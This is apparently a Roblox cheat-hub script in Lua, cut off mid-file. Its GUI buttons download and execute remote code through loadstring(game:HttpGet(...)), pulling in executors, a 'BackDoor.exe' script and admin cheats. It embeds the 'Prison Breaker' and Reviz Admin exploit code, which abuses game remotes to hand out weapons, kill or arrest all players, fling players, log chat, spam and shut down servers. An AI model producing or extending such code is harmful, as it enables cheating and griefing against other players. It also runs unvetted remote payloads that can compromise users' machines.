SunRays.Parent = game:GetService("Lighting")
local Sunset = Instance.new("Sky")
Sunset.Name = "Sunset"
Sunset.SkyboxUp = "rbxassetid://323493360"
Sunset.SkyboxLf = "rbxassetid://323494252"
Sunset.SkyboxBk = "rbxassetid://323494035"
Sunset.SkyboxFt = "rbxassetid://323494130"
Sunset.SkyboxDn = "rbxassetid://323494368"
Sunset.SunAngularSize = 14
Sunset.SkyboxRt = "rbxassetid://323494067"

Sunset.Parent = game:GetService("Lighting")
local Takayama = Instance.new("ColorCorrectionEffect")
Takayama.Name = "Takayama"
Takayama.Enabled = false
Takayama.Saturation = -0.3
Takayama.Contrast = 0.1
Takayama.TintColor = Color3.fromRGB(235, 214, 204)

Takayama.Parent = game:GetService("Lighting")
local L = game:GetService("Lighting")
L.Brightness = 2.14
L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
L.ClockTime = 6.7
L.FogColor = Color3.fromRGB(94, 76, 106)
L.FogEnd = 1000
L.FogStart = 0
L.ExposureCompensation = 0.24
L.ShadowSoftness = 0
L.Ambient = Color3.fromRGB(59, 33, 27)



   end,
})

local Tab = Window:CreateTab("Executors", 4483362458)

local Section = Tab:CreateSection("Arceus X")

local Button = Tab:CreateButton({
   Name = "Arceus x Remake",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
   end,
}) 

local Section = Tab:CreateSection("Synapse X Remake")

local Button = Tab:CreateButton({
   Name = "Synapse X",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
   end,
})

local Section = Tab:CreateSection("BackDoor.Exe")

local Button = Tab:CreateButton({
   Name = "BackDoor",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
   end,
}) 

local Tab = Window:CreateTab("Prison Life", 4483362458)

local Section = Tab:CreateSection("Doors Destroyer")

local Button = Tab:CreateButton({
   Name = "Remove Doors",
   Callback = function()
          game.Workspace.Doors:Destroy()
   end,
}) 

local Section = Tab:CreateSection("Guns")

local Button = Tab:CreateButton({
   Name = "Guns Giver |no M4A1|",
   Callback = function()
          -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(102, 102, 102)
Frame.Position = UDim2.new(0.00939968601, 0, 0.575386047, 0)
Frame.Size = UDim2.new(0, 162, 0, 202)

UICorner.Parent = Frame

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0.127118647, 0, 0.0926060453, 0)
TextButton.Size = UDim2.new(0, 119, 0, 34)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Give M9"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

UICorner_2.Parent = TextButton

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.Position = UDim2.new(0.127000004, 0, 0, 70)
TextButton_2.Size = UDim2.new(0, 120, 0, 34)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Give Remington 870"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 14.000

UICorner_3.Parent = TextButton_2

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.Position = UDim2.new(0.127000004, 0, 0, 125)
TextButton_3.Size = UDim2.new(0, 120, 0, 34)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Give AK-47"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000

UICorner_4.Parent = TextButton_3

-- Scripts:

local function OFFGSQ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		game.Workspace.Remote.ItemHandler:InvokeServer(Workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
	end)
end
coroutine.wrap(OFFGSQ_fake_script)()
local function APPS_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
	end)
end
coroutine.wrap(APPS_fake_script)()
local function SLTT_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		game.Workspace.Remote.ItemHandler:InvokeServer(Workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
	end)
end
coroutine.wrap(SLTT_fake_script)()
   end,
}) 

local Section = Tab:CreateSection("Stamina")

local Button = Tab:CreateButton({
   Name = "Inf Stamina",
   Callback = function()
          loadstring(game:HttpGet("https://scriptblox.com/raw/Prison-Life-(Cars-fixed!)-Inf-Stamina-NO-BUGS-4782"))()
   end,
}) 

local Section = Tab:CreateSection("Admin Scripts")

local Button = Tab:CreateButton({
   Name = "SepTex Admin |KeySystem|",
   Callback = function()
          loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Scorpion Admin",
   Callback = function()
          loadstring(game:HttpGet('https://www.scorpionadm.in/script'))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Prison Breaker",
   Callback = function()
          --Subscribe to Ducky Exploits on YouTube
--Script made by Jake11price on YouTube
local PrisonBreakerv15 = Instance.new("ScreenGui")
local openmain = Instance.new("Frame")
local open = Instance.new("TextButton")
local main = Instance.new("Frame")
local title = Instance.new("TextLabel")
local close = Instance.new("TextButton")
local police = Instance.new("TextButton")
local inmate = Instance.new("TextButton")
local neutral = Instance.new("TextButton")
local arrestcrims = Instance.new("TextButton")
local invis = Instance.new("TextButton")
local superpunch = Instance.new("TextButton")
local guns = Instance.new("TextButton")
local taserbypass = Instance.new("TextButton")
local fling = Instance.new("TextButton")
local reviz = Instance.new("TextButton")
local arrest = Instance.new("TextButton")
local attach = Instance.new("TextButton")
local fastrem = Instance.new("TextButton")
local fastm9 = Instance.new("TextButton")
local fasttaze = Instance.new("TextButton")
local fastak = Instance.new("TextButton")
local killall = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local speed = Instance.new("TextButton")
local respawn = Instance.new("TextButton")
local Credits = Instance.new("TextButton")
local prison = Instance.new("TextButton")
local yard = Instance.new("TextButton")
local crimbase = Instance.new("TextButton")
local title_2 = Instance.new("TextLabel")
local bringall = Instance.new("TextButton")
local drill = Instance.new("TextButton")
local killplrmain = Instance.new("Frame")
local killtext = Instance.new("TextBox")
local kill = Instance.new("TextButton")
local waves = Instance.new("TextButton")
local bigbowl = Instance.new("TextButton")
local tazeplrmain = Instance.new("Frame")
local tazetext = Instance.new("TextBox")
local taze = Instance.new("TextButton")
local teamcrim = Instance.new("TextButton")
local tazeall = Instance.new("TextButton")
local removewalls = Instance.new("TextButton")
local removeall = Instance.new("TextButton")
local lagserver = Instance.new("TextButton")
--Properties:
PrisonBreakerv15.Name = "PrisonBreaker v1.5"
PrisonBreakerv15.Parent = game.CoreGui

openmain.Name = "openmain"
openmain.Parent = PrisonBreakerv15
openmain.BackgroundColor3 = Color3.new(0, 0, 0)
openmain.Position = UDim2.new(0.00434467755, 0, 0.397959173, 0)
openmain.Size = UDim2.new(0, 100, 0, 27)
openmain.Visible = false

open.Name = "open"
open.Parent = openmain
open.BackgroundColor3 = Color3.new(1, 1, 0)
open.Position = UDim2.new(1.49011612e-08, 0, 0, 0)
open.Size = UDim2.new(0, 100, 0, 27)
open.Style = Enum.ButtonStyle.RobloxRoundButton
open.Font = Enum.Font.GothamBold
open.Text = "OPEN"
open.TextColor3 = Color3.new(0, 0, 0)
open.TextSize = 14
open.MouseButton1Down:connect(function()
openmain.Visible = false
main.Visible = true
end)

main.Name = "main"
main.Parent = PrisonBreakerv15
main.BackgroundColor3 = Color3.new(0, 1, 0)
main.Position = UDim2.new(0.00441803597, 0, 0.249908596, 0)
main.Size = UDim2.new(0, 383, 0, 586)
main.Style = Enum.FrameStyle.RobloxRound
main.Active = true
main.Draggable = true

title.Name = "title"
title.Parent = main
title.BackgroundColor3 = Color3.new(0, 0, 1)
title.Position = UDim2.new(-0.0125168273, 0, -0.00528348284, 0)
title.Size = UDim2.new(0, 376, 0, 50)
title.Font = Enum.Font.GothamBold
title.Text = "PrisonBreaker V1.5"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 14

close.Name = "close"
close.Parent = main
close.BackgroundColor3 = Color3.new(0.333333, 0, 1)
close.Position = UDim2.new(0.848563969, 0, -0.00557620823, 0)
close.Size = UDim2.new(0, 59, 0, 50)
close.Font = Enum.Font.GothamBold
close.Text = "X"
close.TextColor3 = Color3.new(0, 0, 0)
close.TextSize = 14
close.MouseButton1Down:connect(function()
main.Visible = false
openmain.Visible = true
end)

police.Name = "police"
police.Parent = main
police.BackgroundColor3 = Color3.new(0, 0, 1)
police.Position = UDim2.new(0.0143180238, 0, 0.108731732, 0)
police.Size = UDim2.new(0, 84, 0, 22)
police.Font = Enum.Font.GothamBold
police.Text = "Team Police"
police.TextColor3 = Color3.new(0, 0, 0)
police.TextSize = 14
police.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright blue")
end)

inmate.Name = "inmate"
inmate.Parent = main
inmate.BackgroundColor3 = Color3.new(1, 0.666667, 0)
inmate.BorderColor3 = Color3.new(1, 0.666667, 0.0901961)
inmate.Position = UDim2.new(0.270111769, 0, 0.107363492, 0)
inmate.Size = UDim2.new(0, 84, 0, 22)
inmate.Font = Enum.Font.GothamBold
inmate.Text = "Team Inmate"
inmate.TextColor3 = Color3.new(0, 0, 0)
inmate.TextSize = 14
inmate.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright orange")
end)

neutral.Name = "neutral"
neutral.Parent = main
neutral.BackgroundColor3 = Color3.new(0.772549, 0.74902, 0.784314)
neutral.Position = UDim2.new(0.525683641, 0, 0.106356524, 0)
neutral.Size = UDim2.new(0, 83, 0, 22)
neutral.Font = Enum.Font.GothamBold
neutral.Text = "Team Neutral"
neutral.TextColor3 = Color3.new(0, 0, 0)
neutral.TextSize = 14
neutral.TextStrokeColor3 = Color3.new(0.333333, 1, 0)
neutral.MouseButton1Down:connect(function()
Workspace.Remote.TeamEvent:FireServer("Medium stone grey")
end)

arrestcrims.Name = "arrestcrims"
arrestcrims.Parent = main
arrestcrims.BackgroundColor3 = Color3.new(0.333333, 1, 1)
arrestcrims.Position = UDim2.new(0.0124716684, 0, 0.160733104, 0)
arrestcrims.Size = UDim2.new(0, 111, 0, 31)
arrestcrims.Font = Enum.Font.GothamBold
arrestcrims.Text = "Arrest Crims"
arrestcrims.TextColor3 = Color3.new(1, 0, 0)
arrestcrims.TextSize = 14
arrestcrims.MouseButton1Down:connect(function()
local Player = game.Players.LocalPlayer
local cpos = Player.Character.HumanoidRootPart.CFrame
for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
if v.Name ~= Player.Name then
local i = 10
    repeat
    wait()
    i = i-1
    game.Workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
    Player.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
    until i == 0
end
end
Player.Character.HumanoidRootPart.CFrame = cpos
Notify("Success", "Arrested all of the n00bs", "Cool!")
end)

invis.Name = "invis"
invis.Parent = main
invis.BackgroundColor3 = Color3.new(0, 1, 1)
invis.Position = UDim2.new(0.348153055, 0, 0.160733074, 0)
invis.Size = UDim2.new(0, 111, 0, 31)
invis.Font = Enum.Font.GothamBold
invis.Text = "Invisible"
invis.TextColor3 = Color3.new(1, 0, 0)
invis.TextSize = 14
invis.MouseButton1Down:connect(function()
local player = game.Players.LocalPlayer
position     = player.Character.HumanoidRootPart.Position
wait(0.1)
player.Character:MoveTo(position + Vector3.new(0, 1000000, 0))
wait(0.1)
humanoidrootpart = player.Character.HumanoidRootPart:clone()
wait(0.1)
player.Character.HumanoidRootPart:Destroy()
humanoidrootpart.Parent = player.Character
player.Character:MoveTo(position)
wait()
-- Remove this if you want to see yourself (others still won't see you)
game.Players.LocalPlayer.Character.Torso.Transparency = 1
game.Players.LocalPlayer.Character.Head.Transparency  = 1
game.Players.LocalPlayer.Character["Left Arm"].Transparency = 1
game.Players.LocalPlayer.Character["Right Arm"].Transparency = 1
game.Players.LocalPlayer.Character["Left Leg"].Transparency = 1
game.Players.LocalPlayer.Character["Right Leg"].Transparency = 1
game.Players.LocalPlayer.Character.Humanoid:RemoveAccessories()
game.Players.LocalPlayer.Character.Head.face:Remove()
end)

superpunch.Name = "superpunch"
superpunch.Parent = main
superpunch.BackgroundColor3 = Color3.new(0, 1, 1)
superpunch.Position = UDim2.new(0.678248107, 0, 0.160733074, 0)
superpunch.Size = UDim2.new(0, 111, 0, 31)
superpunch.Font = Enum.Font.GothamBold
superpunch.Text = "SuperPunch"
superpunch.TextColor3 = Color3.new(1, 0, 0)
superpunch.TextSize = 14
superpunch.MouseButton1Down:connect(function()
mainRemotes = game.ReplicatedStorage meleeRemote = mainRemotes['meleeEvent'] mouse = game.Players.LocalPlayer:GetMouse() punching = false cooldown = false function punch() cooldown = true local part = Instance.new("Part", game.Players.LocalPlayer.Character) part.Transparency = 1 part.Size = Vector3.new(5, 2, 3) part.CanCollide = false local w1 = Instance.new("Weld", part) w1.Part0 = game.Players.LocalPlayer.Character.Torso w1.Part1 = part w1.C1 = CFrame.new(0,0,2) part.Touched:connect(function(hit) if game.Players:FindFirstChild(hit.Parent.Name) then local plr = game.Players:FindFirstChild(hit.Parent.Name) if plr.Name ~= game.Players.LocalPlayer.Name then part:Destroy() for i = 1,100 do meleeRemote:FireServer(plr) end end end end) wait(1) cooldown = false part:Destroy() end mouse.KeyDown:connect(function(key) if cooldown == false then if key:lower() == "f" then punch() end end end)
end)

guns.Name = "guns"
guns.Parent = main
guns.BackgroundColor3 = Color3.new(0, 1, 1)
guns.Position = UDim2.new(0.0124716703, 0, 0.2304198, 0)
guns.Size = UDim2.new(0, 111, 0, 32)
guns.Font = Enum.Font.GothamBlack
guns.Text = "Guns"
guns.TextColor3 = Color3.new(1, 0, 0)
guns.TextSize = 14
guns.MouseButton1Down:connect(function()
for i,v in pairs(Workspace.Prison_ITEMS.giver:GetChildren()) do
 
lol = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
print(lol)
end
end)

taserbypass.Name = "taserbypass"
taserbypass.Parent = main
taserbypass.BackgroundColor3 = Color3.new(0, 1, 1)
taserbypass.Position = UDim2.new(0.348080158, 0, 0.2304198, 0)
taserbypass.Size = UDim2.new(0, 111, 0, 32)
taserbypass.Font = Enum.Font.GothamBold
taserbypass.Text = "Taser Bypass"
taserbypass.TextColor3 = Color3.new(1, 0, 0)
taserbypass.TextSize = 14
taserbypass.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
   game.Players.LocalPlayer.CharacterAdded:connect(function()
   game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
   game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
   end)
end)

fling.Name = "fling"
fling.Parent = main
fling.BackgroundColor3 = Color3.new(0.333333, 1, 1)
fling.Position = UDim2.new(0.00984076969, 0, 0.379423141, 0)
fling.Size = UDim2.new(0, 111, 0, 32)
fling.Font = Enum.Font.GothamBold
fling.Text = "Fling"
fling.TextColor3 = Color3.new(1, 0, 0)
fling.TextSize = 14
fling.MouseButton1Down:connect(function()
power = 300 -- change this to make it more or less powerful

game:GetService('RunService').Stepped:connect(function()
game.Players.LocalPlayer.Character.Head.CanCollide = false
game.Players.LocalPlayer.Character.Torso.CanCollide = false
game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
end)

wait(.1)
local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(power,0,power)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
end)

reviz.Name = "reviz"
reviz.Parent = main
reviz.BackgroundColor3 = Color3.new(0, 1, 1)
reviz.Position = UDim2.new(0.0121497028, 0, 0.303878158, 0)
reviz.Size = UDim2.new(0, 111, 0, 32)
reviz.Font = Enum.Font.GothamBold
reviz.Text = "Reviz Admin"
reviz.TextColor3 = Color3.new(1, 0, 0)
reviz.TextSize = 14
reviz.MouseButton1Down:connect(function()
-- Creator: illremember#3799
 
-- Credits to infinite yield, harkinian, dex creators
 
prefix = ";"
wait(0.3)
Commands = {
    '[-] cmdbar is shown when ; is pressed.',
    '[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player',
    '[2] bring [plr] -- You need a tool! Will bring player to you',
    '[3] spin [plr] -- You need a tool! Makes you and the player spin crazy',
    '[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting',
    '[5] attach [plr] -- You need a tool! Attaches you to player',
    '[6] unattach [plr] -- Attempts to unattach you from a player',
    '[7] follow [plr] -- Makes you follow behind the player',
    '[8] unfollow',
    '[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air',
    '[10] trail [plr] -- The opposite of follow, you stay infront of player',
    '[11] untrail',
    '[12] orbit [plr] -- Makes you orbit the player',
    '[13] unorbit',
    '[14] fling [plr] -- Makes you fling the player',
    '[15] unfling',
    '[16] fecheck -- Checks if the game is FE or not',
    '[17] void [plr] -- Teleports player to the void',
    '[18] noclip -- Gives you noclip to walk through walls',
    '[19] clip -- Removes noclip',
    '[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default',
    '[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default',
    '[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default',
    '[23] default -- Changes your speed, jumppower and hipheight to default values',
    '[24] annoy [plr] -- Loop teleports you to the player',
    '[25] unannoy',
    '[26] headwalk [plr] -- Loop teleports you to the player head',
    '[27] unheadwalk',
    '[28] nolimbs -- Removes your arms and legs',
    '[29] god -- Gives you FE Godmode',
    '[30] drophats -- Drops your accessories',
    '[31] droptool -- Drops any tool you have equipped',
    '[32] loopdhats -- Loop drops your accessories',
    '[33] unloopdhats',
    '[34] loopdtool -- Loop drops any tools you have equipped',
    '[35] unloopdtool',
    '[36] invisible -- Gives you invisibility CREDIT TO TIMELESS',
    '[37] view [plr] -- Changes your camera to the player character',
    '[38] unview',
    '[39] goto [plr] -- Teleports you to player',
    '[40] fly -- Allows you to fly, credit to Infinite Yield',
    '[41] unfly',
    '[42] chat [msg] -- Makes you chat a message',
    '[43] spam [msg] -- Spams a message',
    '[44] unspam',
    '[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second',
    '[46] pmspam [plr] -- Spams a player in private message',
    '[47] unpmspam',
    '[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you',
    '[49] uncfreeze [plr]',
    '[50] unlockws -- Unlocks the workspace',
    '[51] lockws -- Locks the workspace',
    '[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you',
    '[53] pstand -- Enables platform stand',
    '[54] unpstand -- Disables platform stand',
    '[55] blockhead -- Removes your head mesh',
    '[56] sit',
    '[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name',
    '[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided',
    '[59] hypertotal -- Loads in my FE GUI Hypertotal',
    '[60] cmds -- Prints all commands',
    '[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats',
    '[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool',
    '[63] spinner -- Makes you spin',
    '[64] nospinner',
    '[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom',
    '[66] noreach -- Removes reach, must have tool equipped',
    '[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying',
    '[68] tp me [plr] -- Alternative to goto',
    '[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player',
    '[70] uncbring',
    '[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players',
    '[72] givetool [plr] -- Gives the tool you have equipped to the player',
    '[73] glitch [plr] -- Glitches you and the player, looks very cool',
    '[74] unglitch -- Unglitches you',
    '[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode',
    '[76] explorer -- Loads up DEX',
    '[77] reset -- Resets your character.',
    '[78] anim [id] -- Applies an animation on you, must be created by ROBLOX',
    '[79] animgui -- Loads up Energize animations GUI',
    '[80] savepos -- Saves your current position',
    '[81] loadpos -- Teleports you to your saved position',
    '[82] bang [plr] -- 18+ will not work if you have FE Godmode on',
    '[83] unbang',
    '[84] delcmdbar -- Removes the command bar completely',
    '[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model',
    '[86] shutdown -- Uses harkinians script to shutdown server',
    '[87] respawn -- If grespawn doesnt work you can use respawn',
    '[88] delobj [obj] -- Deletes a certain brick in workspace, client sided',
    '[89] getplrs -- Prints all players in game',
    '[90] deldecal -- Deletes all decals client sided',
    '[91] opfinality -- Loads in my FE GUI Opfinality',
    '[92] remotes -- Prints all remotes in the game in the console when added',
    '[93] noremotes -- Stops printing remotes',
    '[94] tpdefault -- Stops all loop teleports to a player',
    '[95] stopsit -- Will not allow you to sit',
    '[96] gosit -- Allows you to sit',
    '[97] clicktp -- Enables click tp',
    '[98] noclicktp -- Disables click tp',
    '[99] toolson -- If any tools are dropped in the workspace you will automatically get them',
    '[100] toolsoff -- Stops ;toolson',
    '[101] version -- Gets the admin version',
    '[102] state [num] -- Changes your humanoid state, ;unstate to stop.',
    '[103] gravity [num] -- Changes workspace gravity default is 196.2',
    '[104] pgs -- Checks if the game has PGSPhysicsSolverEnabled enabled',
    '[105] clickdel -- Delete any block you press q on, client sided',
    '[106] noclickdel -- Stops clickdel',
    '[107] looprhats -- Loop removes mesh of your hats/loop block hats',
    '[108] unlooprhats -- Stops loop removing mesh',
    '[109] looprtool -- Loop removes mesh of your tool/loop block tools',
    '[110] unlooprtool -- Stops loop removing mesh',
    '[111] givealltools [plr] -- Gives all the tools you have in your backpack to the player',
    '[112] age [plr] -- Makes you chat the account age of the player',
    '[113] id [plr] -- Makes you chat the account ID of the player',
    '[114] .age [plr] -- Privately shows you the account age of the player',
    '[115] .id [plr] -- Privately shows you the account ID of the player',
    '[116] gameid -- Shows the game ID',
    '[117] removeinvis -- Removes all invisible walls/parts, client sided',
    '[118] removefog -- Removes fog, client sided',
    '[119] disable -- Disables your character by removing humanoid',
    '[120] enable -- Enables your character by adding humanoid',
    '[121] prefix [key] -- Changes the prefix used, default is ;',
    '[122] ;resetprefix -- Resets the prefix to ; incase you change it to an unusable prefix. Say exactly ";resetprefix" to do this command, no matter what your prefix is set to.',
    '[123] flyspeed [num] -- Change your fly speed, default is 1',
    '[124] carpet [plr] -- Makes you a carpet for a player, will not work if FE Godmode is on',
    '[125] uncarpet -- Stops carpet player',
    '[126] stare [plr] -- Turns your character to stare at another player',
    '[127] unstare -- Stops stare player',
    '[128] logchat -- Logs all chat (including /e and whispers) of all players',
    '[129] unlogchat -- Disables logchat',
    '[130] fixcam -- Fixes/resets your camera',
    '[131] unstate -- Stops changing state',
}
speedget = 1
 
lplayer = game:GetService("Players").LocalPlayer
 
lplayer.CharacterAdded:Connect(function(character)
    spin = false
    flying = false
    staring = false
    banpl = false
end)
 
function change()
    prefix = prefix
    speedfly = speedfly
end
 
function GetPlayer(String) -- Credit to Timeless/xFunnieuss
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            table.insert(Found,v)
        end
    elseif strl == "others" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end  
    elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end
 
local Mouse = lplayer:GetMouse()
 
spin = false
followed = false
traill = false
noclip = false
annoying = false
hwalk = false
droppinghats = false
droppingtools = false
flying = false
spamdelay = 1
spamming = false
spammingpm = false
cbringing = false
remotes = true
added = true
binds = false
stopsitting = false
clickgoto = false
gettingtools = false
removingmeshhats = false
removingmeshtool = false
clickdel = false
staring = false
chatlogs = false
banpl = false
changingstate = false
statechosen = 0
 
adminversion = "Reviz Admin by illremember, Version 2.0"
 
flying = false
speedfly = 1
 
function plrchat(plr, chat)
print(plr.Name..": "..tick().."\n"..chat)
end
 
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
v.Chatted:connect(function(chat)
if chatlogs then
plrchat(v, chat)
end
end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
plr.Chatted:connect(function(chat)
if chatlogs then
plrchat(plr, chat)
end
end)
end)
 
 
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local CMDBAR = Instance.new("TextBox")
ScreenGui.Parent = game:GetService("CoreGui")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.3, 0.1, 0.1)
Frame.BackgroundTransparency = 0.3
Frame.Position = UDim2.new(0.5, 0, 0, 10)
Frame.Size = UDim2.new(0, 200, 0, 40)
Frame.Active = true
Frame.Draggable = true
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = Frame
CMDBAR.BackgroundColor3 = Color3.new(0.105882, 0.164706, 0.207843)
CMDBAR.BackgroundTransparency = 0.20000000298023
CMDBAR.Size = UDim2.new(0, 180, 0, 20)
CMDBAR.Position = UDim2.new(0.05, 0, 0.25, 0)
CMDBAR.Font = Enum.Font.SourceSansLight
CMDBAR.FontSize = Enum.FontSize.Size14
CMDBAR.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CMDBAR.TextScaled = true
CMDBAR.TextSize = 14
CMDBAR.TextWrapped = true
CMDBAR.Text = "Press ; to type, Enter to execute"
 
local CMDS = Instance.new("ScreenGui")
local CMDSFRAME = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local closegui = Instance.new("TextButton")
CMDS.Name = "CMDS"
CMDS.Parent = game:GetService("CoreGui")
CMDSFRAME.Name = "CMDSFRAME"
CMDSFRAME.Parent = CMDS
CMDSFRAME.Active = true
CMDSFRAME.BackgroundColor3 = Color3.new(0.223529, 0.231373, 0.309804)
CMDSFRAME.BorderSizePixel = 0
CMDSFRAME.Draggable = true
CMDSFRAME.Position = UDim2.new(0, 315, 0, 100)
CMDSFRAME.Size = UDim2.new(0, 275, 0, 275)
CMDSFRAME.Visible = false
ScrollingFrame.Parent = CMDSFRAME
ScrollingFrame.BackgroundColor3 = Color3.new(0.160784, 0.160784, 0.203922)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0729999989, 0)
ScrollingFrame.Size = UDim2.new(1.04999995, 0, 0.92900002, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
TextLabel.Parent = ScrollingFrame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(0.930000007, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.FontSize = Enum.FontSize.Size18
TextLabel.Text = "[-] cmdbar is shown when ; is pressed.,\n[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player,\n[2] bring [plr] -- You need a tool! Will bring player to you,\n[3] spin [plr] -- You need a tool! Makes you and the player spin crazy,\n[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting,\n[5] attach [plr] -- You need a tool! Attaches you to player,\n[6] unattach [plr] -- Attempts to unattach you from a player,\n[7] follow [plr] -- Makes you follow behind the player,\n[8] unfollow,\n[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air,\n[10] trail [plr] -- The opposite of follow, you stay infront of player,\n[11] untrail,\n[12] orbit [plr] -- Makes you orbit the player,\n[13] unorbit,\n[14] fling [plr] -- Makes you fling the player,\n[15] unfling,\n[16] fecheck -- Checks if the game is FE or not,\n[17] void [plr] -- Teleports player to the void,\n[18] noclip -- Gives you noclip to walk through walls,\n[19] clip -- Removes noclip,\n[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default,\n[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default,\n[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default,\n[23] default -- Changes your speed, 